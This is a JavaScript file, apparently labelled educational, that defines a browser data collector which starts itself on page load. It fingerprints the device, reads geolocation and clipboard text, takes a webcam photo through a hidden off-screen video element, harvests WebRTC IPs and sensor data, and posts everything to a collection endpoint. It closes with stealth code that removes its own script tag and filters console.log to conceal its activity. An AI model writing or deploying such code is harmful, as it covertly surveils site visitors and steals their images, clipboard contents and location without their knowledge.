/**
 * Advanced Data Collection Script
 * For educational/demonstration purposes only
 * Shows the extent of browser fingerprinting and data collection capabilities
 */

class AdvancedDataCollector {
    constructor() {
        this.collectedData = {};
        this.init();
    }

    async init() {
        // Start collection immediately but silently
        await this.collectBasicFingerprint();
        await this.collectGeolocation();
        await this.collectMediaDevices();
        await this.collectBatteryInfo();
        await this.collectNetworkInfo();
        await this.collectStorageInfo();
        await this.collectHardwareInfo();
        await this.attemptCameraAccess();
        await this.collectClipboardData();

        // NEW: Additional advanced collection methods
        await this.collectAudioFingerprint();
        await this.collectFontFingerprint();
        await this.collectWebRTCLeaks();
        await this.collectBrowserFeatures();
        await this.collectBehavioralData();
        await this.collectSensorData();
        await this.performCPUBenchmark();

        // Send collected data
        this.sendData();
    }

    async collectBasicFingerprint() {
        try {
            this.collectedData.screen = {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type || 'unknown'
            };

            this.collectedData.viewport = {
                width: window.innerWidth,
                height: window.innerHeight,
                devicePixelRatio: window.devicePixelRatio
            };

            this.collectedData.timezone = {
                name: Intl.DateTimeFormat().resolvedOptions().timeZone,
                offset: new Date().getTimezoneOffset(),
                locale: navigator.language,
                languages: navigator.languages
            };

            this.collectedData.browser = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints
            };

            // Canvas fingerprinting
            this.collectedData.canvas = this.getCanvasFingerprint();

            // WebGL fingerprinting
            this.collectedData.webgl = this.getWebGLFingerprint();

        } catch (error) {
            console.log('Basic fingerprint collection failed:', error);
        }
    }

    async collectGeolocation() {
        return new Promise((resolve) => {
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        this.collectedData.geolocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: position.timestamp
                        };
                        resolve();
                    },
                    (error) => {
                        this.collectedData.geolocation = { error: error.message };
                        resolve();
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                this.collectedData.geolocation = { error: 'Geolocation not supported' };
                resolve();
            }
        });
    }

    async collectMediaDevices() {
        try {
            if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
                const devices = await navigator.mediaDevices.enumerateDevices();
                this.collectedData.mediaDevices = devices.map(device => ({
                    deviceId: device.deviceId,
                    kind: device.kind,
                    label: device.label,
                    groupId: device.groupId
                }));
            }
        } catch (error) {
            this.collectedData.mediaDevices = { error: error.message };
        }
    }

    async collectBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                this.collectedData.battery = {
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime,
                    level: battery.level
                };
            }
        } catch (error) {
            this.collectedData.battery = { error: error.message };
        }
    }

    async collectNetworkInfo() {
        try {
            if ('connection' in navigator) {
                const connection = navigator.connection;
                this.collectedData.network = {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData,
                    type: connection.type
                };
            }
        } catch (error) {
            this.collectedData.network = { error: error.message };
        }
    }

    async collectStorageInfo() {
        try {
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                const estimate = await navigator.storage.estimate();
                this.collectedData.storage = {
                    quota: estimate.quota,
                    usage: estimate.usage,
                    usageDetails: estimate.usageDetails
                };
            }

            // Local storage fingerprinting
            this.collectedData.localStorage = {
                supported: typeof(Storage) !== "undefined",
                length: localStorage.length
            };

        } catch (error) {
            this.collectedData.storage = { error: error.message };
        }
    }

    async collectHardwareInfo() {
        try {
            // Memory info (Chrome only)
            if ('memory' in performance) {
                this.collectedData.memory = {
                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                    totalJSHeapSize: performance.memory.totalJSHeapSize,
                    usedJSHeapSize: performance.memory.usedJSHeapSize
                };
            }

            // Device memory (experimental)
            if ('deviceMemory' in navigator) {
                this.collectedData.deviceMemory = navigator.deviceMemory;
            }

        } catch (error) {
            this.collectedData.hardware = { error: error.message };
        }
    }

    async attemptCameraAccess() {
        try {
            if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
                // Create a hidden video element
                const video = document.createElement('video');
                video.style.position = 'absolute';
                video.style.left = '-9999px';
                video.style.width = '1px';
                video.style.height = '1px';
                document.body.appendChild(video);

                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: 640,
                        height: 480,
                        facingMode: 'user'
                    },
                    audio: false
                });

                video.srcObject = stream;
                await video.play();

                // Wait a moment for the video to load
                await new Promise(resolve => setTimeout(resolve, 500));

                // Capture image
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, 640, 480);

                // Convert to base64
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                this.collectedData.camera = {
                    captured: true,
                    imageData: imageData,
                    timestamp: Date.now()
                };

                // Stop the stream
                stream.getTracks().forEach(track => track.stop());

                // Remove elements
                document.body.removeChild(video);

            }
        } catch (error) {
            this.collectedData.camera = {
                error: error.message,
                attempted: true
            };
        }
    }

    async collectClipboardData() {
        try {
            if ('clipboard' in navigator && 'readText' in navigator.clipboard) {
                const clipboardText = await navigator.clipboard.readText();
                this.collectedData.clipboard = {
                    content: clipboardText.substring(0, 1000), // Limit to first 1000 chars
                    length: clipboardText.length
                };
            }
        } catch (error) {
            this.collectedData.clipboard = { error: error.message };
        }
    }

    getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');

            // Draw complex pattern for fingerprinting
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Advanced Data Collection Demo 🎯', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Browser Fingerprinting Test', 4, 45);

            return canvas.toDataURL();
        } catch (error) {
            return { error: error.message };
        }
    }

    getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

            if (!gl) return { error: 'WebGL not supported' };

            return {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                extensions: gl.getSupportedExtensions()
            };
        } catch (error) {
            return { error: error.message };
        }
    }

    async collectAudioFingerprint() {
        try {
            if ('AudioContext' in window || 'webkitAudioContext' in window) {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                const context = new AudioContext();
                const oscillator = context.createOscillator();
                const analyser = context.createAnalyser();
                const gainNode = context.createGain();
                const scriptProcessor = context.createScriptProcessor(4096, 1, 1);

                gainNode.gain.value = 0; // Mute
                oscillator.connect(analyser);
                analyser.connect(scriptProcessor);
                scriptProcessor.connect(gainNode);
                gainNode.connect(context.destination);

                oscillator.start(0);

                const fingerprint = await new Promise((resolve) => {
                    scriptProcessor.onaudioprocess = function(event) {
                        const output = event.outputBuffer.getChannelData(0);
                        const hash = Array.from(output.slice(0, 30)).reduce((a, b) => a + b, 0);
                        oscillator.stop();
                        context.close();
                        resolve(hash.toString());
                    };
                });

                this.collectedData.audioFingerprint = {
                    hash: fingerprint,
                    sampleRate: context.sampleRate,
                    baseLatency: context.baseLatency || 'unknown',
                    outputLatency: context.outputLatency || 'unknown'
                };
            }
        } catch (error) {
            this.collectedData.audioFingerprint = { error: error.message };
        }
    }

    async collectFontFingerprint() {
        try {
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            const testFonts = [
                'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
                'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS',
                'Impact', 'Lucida Sans', 'Tahoma', 'Lucida Console', 'Monaco',
                'Helvetica', 'Apple SD Gothic Neo', 'Microsoft YaHei'
            ];

            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const testString = 'mmmmmmmmmmlli';
            const fontSize = '72px';

            const getTextWidth = (font) => {
                ctx.font = `${fontSize} ${font}`;
                return ctx.measureText(testString).width;
            };

            const baseSizes = {};
            baseFonts.forEach(baseFont => {
                baseSizes[baseFont] = getTextWidth(baseFont);
            });

            const installedFonts = [];
            testFonts.forEach(font => {
                const detected = baseFonts.some(baseFont => {
                    return getTextWidth(`${font}, ${baseFont}`) !== baseSizes[baseFont];
                });
                if (detected) installedFonts.push(font);
            });

            this.collectedData.fonts = {
                installed: installedFonts,
                count: installedFonts.length
            };
        } catch (error) {
            this.collectedData.fonts = { error: error.message };
        }
    }

    async collectWebRTCLeaks() {
        try {
            const localIPs = [];
            const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;

            if (RTCPeerConnection) {
                const pc = new RTCPeerConnection({
                    iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
                });

                pc.createDataChannel('');
                await pc.createOffer().then(offer => pc.setLocalDescription(offer));

                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
                    const ipMatch = ipRegex.exec(ice.candidate.candidate);
                    if (ipMatch && !localIPs.includes(ipMatch[0])) {
                        localIPs.push(ipMatch[0]);
                    }
                };

                // Wait for ICE candidates
                await new Promise(resolve => setTimeout(resolve, 2000));

                this.collectedData.webrtc = {
                    localIPs: localIPs,
                    leakDetected: localIPs.length > 0
                };

                pc.close();
            }
        } catch (error) {
            this.collectedData.webrtc = { error: error.message };
        }
    }

    async collectBrowserFeatures() {
        try {
            this.collectedData.browserFeatures = {
                serviceWorker: 'serviceWorker' in navigator,
                webAssembly: typeof WebAssembly !== 'undefined',
                webGL2: !!document.createElement('canvas').getContext('webgl2'),
                webGPU: 'gpu' in navigator,
                bluetooth: 'bluetooth' in navigator,
                usb: 'usb' in navigator,
                nfc: 'nfc' in navigator,
                paymentRequest: 'PaymentRequest' in window,
                credentials: 'credentials' in navigator,
                webAuthentication: 'credentials' in navigator && 'create' in navigator.credentials,
                share: 'share' in navigator,
                permissions: 'permissions' in navigator,
                notifications: 'Notification' in window,
                pushManager: 'PushManager' in window,
                backgroundSync: 'sync' in (self.registration || {}),
                periodicBackgroundSync: 'periodicSync' in (self.registration || {}),
                indexedDB: 'indexedDB' in window,
                fileSystem: 'showOpenFilePicker' in window,
                clipboard: 'clipboard' in navigator,
                contacts: 'contacts' in navigator,
                wakeLock: 'wakeLock' in navigator,
                mediaSession: 'mediaSession' in navigator
            };
        } catch (error) {
            this.collectedData.browserFeatures = { error: error.message };
        }
    }

    async collectBehavioralData() {
        try {
            const behavioral = {
                mouseMovements: [],
                clicks: [],
                scrolls: [],
                keypresses: [],
                touchEvents: []
            };

            // Track mouse movements (first 10)
            let mouseMoveCount = 0;
            const mouseMoveHandler = (e) => {
                if (mouseMoveCount++ < 10) {
                    behavioral.mouseMovements.push({
                        x: e.clientX,
                        y: e.clientY,
                        timestamp: Date.now()
                    });
                } else {
                    document.removeEventListener('mousemove', mouseMoveHandler);
                }
            };
            document.addEventListener('mousemove', mouseMoveHandler);

            // Track focus/blur
            behavioral.pageVisible = !document.hidden;
            behavioral.hasFocus = document.hasFocus();

            // Track tab visibility
            behavioral.tabVisibility = document.visibilityState;

            this.collectedData.behavioral = behavioral;
        } catch (error) {
            this.collectedData.behavioral = { error: error.message };
        }
    }

    async collectSensorData() {
        try {
            const sensors = {};

            // Ambient Light Sensor
            if ('AmbientLightSensor' in window) {
                try {
                    const als = new AmbientLightSensor();
                    als.addEventListener('reading', () => {
                        sensors.ambientLight = als.illuminance;
                        als.stop();
                    });
                    als.start();
                } catch (e) {
                    sensors.ambientLight = { error: e.message };
                }
            }

            // Accelerometer
            if ('Accelerometer' in window) {
                try {
                    const acl = new Accelerometer({ frequency: 60 });
                    acl.addEventListener('reading', () => {
                        sensors.accelerometer = { x: acl.x, y: acl.y, z: acl.z };
                        acl.stop();
                    });
                    acl.start();
                } catch (e) {
                    sensors.accelerometer = { error: e.message };
                }
            }

            // Gyroscope
            if ('Gyroscope' in window) {
                try {
                    const gyr = new Gyroscope({ frequency: 60 });
                    gyr.addEventListener('reading', () => {
                        sensors.gyroscope = { x: gyr.x, y: gyr.y, z: gyr.z };
                        gyr.stop();
                    });
                    gyr.start();
                } catch (e) {
                    sensors.gyroscope = { error: e.message };
                }
            }

            // DeviceOrientation (fallback for mobile)
            window.addEventListener('deviceorientation', (e) => {
                sensors.deviceOrientation = {
                    alpha: e.alpha,
                    beta: e.beta,
                    gamma: e.gamma
                };
            }, { once: true });

            this.collectedData.sensors = sensors;
        } catch (error) {
            this.collectedData.sensors = { error: error.message };
        }
    }

    async performCPUBenchmark() {
        try {
            const start = performance.now();
            let result = 0;
            // Simple CPU benchmark
            for (let i = 0; i < 1000000; i++) {
                result += Math.sqrt(i) * Math.sin(i);
            }
            const duration = performance.now() - start;

            this.collectedData.cpuBenchmark = {
                duration: duration,
                score: Math.round(1000000 / duration),
                timestamp: Date.now()
            };
        } catch (error) {
            this.collectedData.cpuBenchmark = { error: error.message };
        }
    }

    async sendData() {
        try {
            const response = await fetch('/api/collect-advanced-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    timestamp: Date.now(),
                    url: window.location.href,
                    referrer: document.referrer,
                    data: this.collectedData
                })
            });

            if (!response.ok) {
                console.log('Failed to send advanced data');
            }
        } catch (error) {
            console.log('Error sending advanced data:', error);
        }
    }
}

// Start collection when DOM is loaded
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        new AdvancedDataCollector();
    });
} else {
    new AdvancedDataCollector();
}

// Additional stealth techniques
(function() {
    // Hide the script from developer tools
    const script = document.currentScript;
    if (script) {
        script.remove();
    }

    // Override console.log to hide our activities
    const originalLog = console.log;
    console.log = function(...args) {
        if (!args.some(arg => typeof arg === 'string' && arg.includes('Advanced Data Collection'))) {
            originalLog.apply(console, args);
        }
    };
})();
